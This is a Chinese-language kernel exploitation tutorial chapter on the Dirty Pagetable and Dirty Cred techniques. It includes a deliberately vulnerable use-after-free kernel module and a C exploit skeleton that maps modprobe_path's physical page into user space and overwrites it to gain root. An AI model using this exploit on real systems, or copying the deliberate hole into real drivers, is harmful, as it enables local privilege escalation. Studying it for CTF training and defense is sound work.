# Ch 14 — Dirty Pagetable / Dirty Cred：不經 ROP 拿任意 R/W

> 目標：兩個 2022-2023 的主流技術。Dirty Pagetable 把 PTE 改掉拿到任意實體記憶體 R/W；Dirty Cred 把 `struct file` 的 privilege 偷換。兩者都不需要 RIP 控制，繞過 CFI，也不需要 leak kernel base。

## 為什麼需要這兩個技術

到 Ch 13 為止，你學的攻擊路徑都指向「控制 RIP，然後 ROP chain 提權」。這條路在 2023 年後碰上了兩個問題：

1. **KCFI**（kernel Control Flow Integrity）：indirect call 的目標被限制在 type-compatible function。tty_struct ops hijack、seq_operations hijack 全都進不去錯誤 function type。
2. **CFI + shadow call stack**：讓 return address 也受保護，純 ROP 路也更窄。

但這些 mitigation 只擋「執行流」。你**把 data 改掉不需要 indirect call** — 只要有任意寫原語，把 `current->cred` 的 uid 改成 0，不需要執行任何 gadget，下一次 `getuid()` 就回 0。

Dirty Pagetable 提供「任意實體記憶體讀寫」，Dirty Cred 提供「不要任意寫也能換權限」。

---

## Part A — Dirty Pagetable

### 核心想法

x86-64 的虛擬記憶體靠四層 page table 把 VA 對應到 PA：PGD → P4D → PUD → PMD → PTE。最底層 **PTE**（Page Table Entry）是一個 8-byte 整數，記錄「這段虛擬地址對應到哪個實體 page、有哪些 permission bit（R/W/X/U/NX/...）」。

**如果你能覆寫一個 PTE**，就能把某段 user-space VA 映射到任意實體 page。讀那段 VA → 讀任意實體記憶體；寫那段 VA → 寫任意實體記憶體。完全繞過 SMAP（SMAP 只管 user-space VA 在 kernel 裡的存取，不管 user-space 自己讀自己的 VA）。

### Page table page 的 SLUB 特性

PTE page（存放 PTE 的那層 page）是 4KB、order-0 的物理 page。**它不在 SLUB 任何 cache 裡** — 它直接由 `alloc_page(GFP_PGTABLE_USER)` 從 buddy allocator 拿，而且這個 flag 告訴 buddy「這是 page table page」。

關鍵：buddy allocator 管的是 physical page，它**不知道** page 上面的內容是什麼。如果你用 cross-cache 把一個 kmalloc slab page 還給 buddy，然後 kernel 把同一個物理 page 當 PTE page 拿去用，你的 dangling pointer 就指著 PTE page。

**Dirty Pagetable 時序**：

```
1. UAF / OOB → dangling pointer 指著 kmalloc-N 的某 chunk
2. grooming：讓整個 slab page 還給 buddy（Ch 13 cross-cache 手法）
3. 觸發大量 mmap() — kernel 為 user 分配 PTE page
   → buddy 把剛回收的那個物理 page 當 PTE page 交出去
4. dangling pointer 現在指著 PTE page（某段 user VA 的頁表）
5. 對 dangling pointer 做 8-byte write
   → 改了 PTE：把某段 user VA 的實體映射改成 target_phys_page
6. user 讀寫那段 VA → 讀寫 target_phys_page 的內容
```

### 找 target_phys_page：打誰最有價值

有了任意實體 R/W，你能打：

| Target | 打法 |
|---|---|
| `modprobe_path` | 找到 kernel `.data` 段的物理地址，改字串 |
| `init_cred` | 找到 `init_cred` 所在物理 page，改 uid/gid |
| 某個 process 的 `task_struct` | 找到它的物理 page，改 cred pointer |
| Kernel code (.text) | 把 NX bit 清掉或改指令（若 WP 未開） |
| 任意 user-space process 的 page | 讀取其記憶體（跨 process 讀） |

最穩的目標是 `modprobe_path`：你不需要算 kernel VA，只要找到存那個字串的實體 page 就夠。

### 找 PTE page 的策略

你知道 dangling pointer 的 **kernel VA**（你 alloc 時拿到的地址）。你需要推算它對應到哪個 user 的 PTE page、這個 PTE entry 管理的是哪段 user VA。

方法：

```c
/* 1. mmap 一大片連續 VA */
void *map = mmap(NULL, 0x400000, PROT_READ|PROT_WRITE,
                 MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);

/* 2. 存取每個 page → 觸發 page fault → kernel 配 PTE */
for (size_t i = 0; i < 0x400000; i += 0x1000)
    *(volatile char *)(map + i) = 0;

/* 3. dangling write → 覆寫某個 PTE */
/* 你不知道覆到哪一條 PTE，但可以掃 map 範圍，
   找哪個 page 的內容變了（或變成某個 known 物理 page 的內容） */
```

實務上配合「特徵物理 page」（例如 `modprobe_path` 所在 page 有已知字串）來做驗證：

```c
/* 暴力掃：改一個 PTE entry 讓它指向每個可能的物理 page */
/* 在 QEMU + 已知 phys base 的環境下可以直接算 */
uint64_t phys = known_phys_base + target_offset;
uint64_t new_pte = phys | PTE_PRESENT | PTE_WRITABLE | PTE_USER;
/* 對 dangling pointer 寫這個 8-byte value */
```

### 防護 bypass

Dirty Pagetable 對以下 mitigation 無效：

- **SLAB_VIRTUAL**（kernel 6.5+ 部分 cache）：slab page 不與 buddy allocator 共享，page 不會被 PTE 回收。被這個擋住時要換其他技術。
- **PKS**（Protection Keys for Supervisor）：對 page table page 額外加 protection key，即使你改了 PTE 也可能被擋。kernelCTF 的 COS kernel 開了這個。

---

## Part B — Dirty Cred

### 核心想法（Zhenpeng Lin, Black Hat 2022）

Linux 的 file credential 機制：`struct file` 有一個 `f_cred` 欄位，指向 file open 時的 process credential。某些 privileged file operation（例如 `setuid` binary 的執行、proc 的部分 write path）會 check `f_cred` 而不是 `current->cred`。

Dirty Cred 的目標：**把一個 high-privilege 的 `struct file` 和一個 low-privilege 的 `struct file` 互換底層記憶體**，讓 low-privilege 的 fd 取得 high-privilege 的 `f_cred`。

具體路徑：

```
1. open() 一個需要特殊 f_cred 的 fd（例如 /proc/sysrq-trigger 需要 root cred）
   → 記為 high_fd，底層 struct file 有 root cred
2. open() 一個普通 fd（user cred）— 記為 low_fd
3. UAF：free low_fd 的 struct file，dangling pointer 留著
4. cross-cache / heap spray：讓 high_fd 的 struct file 被 alloc 到剛 free 掉的位置
5. 現在 low_fd → 指著 high_fd 的底層 struct file
6. 對 low_fd 寫 → kernel 走 low_fd 的 file ops，
   但 f_cred check 用的是 high_fd 的 root cred → 寫通過
```

### 另一個常見 Dirty Cred 路徑：cred swap

```
1. 攻擊者 process A（uid=1000）和 process B（uid=0，例如 sudo daemon）
2. UAF on struct cred（cross-cache 到 cred_jar，Ch 13）
3. free A 的 cred，讓 B fork 時的新 cred 落在同一個物理位置
4. A 的 dangling cred pointer 現在指著 B 的 child cred
5. A 對 dangling cred 寫 → 把 B child 的 uid 改成 0
   → 或者讓 A 自己的 cred 指標改掉（需要 write primitive）
```

實際 CTF 中最常見的是 Ch 13 路：UAF → cross-cache → cred_jar → overwrite uid/gid = 0。這嚴格來說已經是 Dirty Cred 的精神（data only，不走 RIP）。

### 為什麼 Dirty Cred > ROP（在 CFI 環境下）

| | ROP / JOP | Dirty Cred / Dirty Pagetable |
|---|---|---|
| KCFI 影響 | 被擋（indirect call type check） | 不走 indirect call |
| Kernel base leak 需求 | 必要（gadget 地址要算） | 不需要（改 data 不用地址） |
| 穩定性 | 受 KASLR / FGKASLR 影響 | 只受 data 地址影響 |
| 適用 kernel | < 6.2 比較穩 | 6.x 還有效 |

---

## Vulnerable Module

```c
/* vuln_dp.c：kmalloc-512 UAF，用來練 Dirty Pagetable */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>

#define DP_ALLOC   _IO('D', 1)
#define DP_FREE    _IO('D', 2)
#define DP_READ    _IOR('D', 3, unsigned long)
#define DP_WRITE   _IOW('D', 4, unsigned long)

#define CHUNK_SZ 512

static char *g_buf = NULL;

static long dp_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    struct { unsigned long off; char data[64]; } karg;
    switch (cmd) {
    case DP_ALLOC:
        g_buf = kzalloc(CHUNK_SZ, GFP_KERNEL);
        return 0;
    case DP_FREE:
        kfree(g_buf);       /* dangling */
        return 0;
    case DP_READ:
        if (copy_to_user((void __user *)arg, g_buf, CHUNK_SZ)) return -EFAULT;
        return 0;
    case DP_WRITE:
        if (copy_from_user(g_buf, (void __user *)arg, CHUNK_SZ)) return -EFAULT;
        return 0;
    }
    return -EINVAL;
}

static struct file_operations dp_fops = { .unlocked_ioctl = dp_ioctl };
static struct miscdevice dp_dev = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln_dp", .fops = &dp_fops,
};
static int __init m_init(void) { return misc_register(&dp_dev); }
static void __exit m_exit(void) { misc_deregister(&dp_dev); }
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

## Exploit 骨架（Dirty Pagetable → modprobe_path）

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/msg.h>

#define DP_ALLOC  _IO('D', 1)
#define DP_FREE   _IO('D', 2)
#define DP_WRITE  _IOW('D', 4, unsigned long)

/* x86-64 PTE bit flags */
#define PTE_PRESENT   (1ULL << 0)
#define PTE_WRITABLE  (1ULL << 1)
#define PTE_USER      (1ULL << 2)
#define PTE_NX        (1ULL << 63)

/* 在已知 QEMU 環境下，從 /proc/iomem + /proc/kallsyms 拿到這些值 */
extern uint64_t kernel_phys_base;   /* kernel 物理基址 */
extern uint64_t modprobe_path_off;  /* modprobe_path 相對 kernel phys base 的 offset */

int main(void)
{
    int fd = open("/dev/vuln_dp", O_RDWR);

    /* 1. 大量 mmap，觸發 PTE page 分配 */
    void *map = mmap(NULL, 0x200000, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    for (size_t i = 0; i < 0x200000; i += 0x1000)
        *(volatile char *)(map + i) = 0;   /* touch → PTE alloc */

    /* 2. kmalloc-512 UAF grooming（簡化：直接 alloc + free） */
    ioctl(fd, DP_ALLOC, 0);
    /* ... spray kmalloc-512 padding，讓 slab page 還給 buddy ... */
    ioctl(fd, DP_FREE, 0);

    /* 3. mmap 更多 → buddy 把剛回收的 page 當 PTE page */
    void *map2 = mmap(NULL, 0x200000, PROT_READ|PROT_WRITE,
                      MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    for (size_t i = 0; i < 0x200000; i += 0x1000)
        *(volatile char *)(map2 + i) = 0;

    /* 4. 構造惡意 PTE：把某個 user VA 映射到 modprobe_path 所在物理 page */
    uint64_t target_phys = kernel_phys_base + modprobe_path_off;
    target_phys &= ~0xFFFULL;   /* page align */

    /* PTE = 物理地址 | R/W/U/Present */
    uint64_t evil_pte = target_phys | PTE_PRESENT | PTE_WRITABLE | PTE_USER;

    /* 5. 對 dangling pointer 寫 evil_pte（8 bytes） */
    char payload[512];
    memset(payload, 0, sizeof(payload));
    /* 假設 dangling pointer 指向 PTE page 的開頭 — entry 0 */
    *(uint64_t *)payload = evil_pte;
    ioctl(fd, DP_WRITE, (unsigned long)payload);

    /* 6. map2 的 VA page 0 現在映射到 modprobe_path 所在物理 page */
    uint64_t page_off = modprobe_path_off & 0xFFF;
    char *target = (char *)map2 + page_off;

    /* 7. 寫 modprobe_path */
    memcpy(target, "/tmp/x\0", 7);
    printf("[*] modprobe_path overwritten: %s\n", target);

    /* 8. 觸發 modprobe：執行未知 elf header 的 binary */
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/t && chmod +x /tmp/t && /tmp/t");
    /* 此時 kernel 呼叫 modprobe_path (/tmp/x) 取得 root */

    return 0;
}
```

> 實作說明：步驟 4 的「知道 dangling pointer 落在哪個 PTE page 的哪個 entry」是真正的難點。實際 exploit 要透過 spray 量控制和掃描 `map2` 的內容改變來推算。在 QEMU + GDB 環境下可以直接讀物理地址驗證。

## 動手練習

1. **讀 arch/x86/include/asm/pgtable_types.h**：找 `_PAGE_PRESENT`、`_PAGE_RW`、`_PAGE_USER`、`_PAGE_NX` 的 bit 定義，驗證 exploit 骨架裡的 PTE flag 是否正確。
2. **用 QEMU monitor 驗 PTE**：`hmp info mem` + `hmp xp /1xg <phys_addr>` 確認你改的那個 PTE entry 內容對不對。
3. **改成 打 init_cred**：把 target_phys 從 `modprobe_path` 改成 `init_cred` 所在物理地址，確認 cred 的 uid 欄位 offset，寫 0 進去。
4. **測量成功率**：跑 100 次，計算「PTE 被改到對的那個 entry」的成功率。分析跟 mmap 大小的關係。
5. **Dirty Cred 實作**：改 vuln_dp，加一個 `cred` 欄位的替換路徑，不走 PTE，直接 cross-cache 到 `cred_jar`，比較兩種方法的穩定性。

## 自我檢核

- [ ] 能解釋為什麼 Dirty Pagetable 繞過 KCFI（沒有 indirect call）
- [ ] 知道 PTE 的 8-byte 格式：哪些 bit 是物理地址、哪些是 flag
- [ ] 知道 cross-cache → PTE page 的時序（slab → buddy → pgtable alloc）
- [ ] 能說出 Dirty Pagetable 對 SLAB_VIRTUAL 無效的原因
- [ ] 知道 `modprobe_path` 技術不需要 kernel base leak 的原因（物理掃描）
- [ ] 能解釋 Dirty Cred 的 `f_cred` swap 思路

下一章換角度：把 kernel page 映射進 user space，讓 user 直接讀寫 kernel 記憶體 — USMA。

→ [Ch 15 — USMA：把 kernel page 映射進 userspace](./15-usma.md)
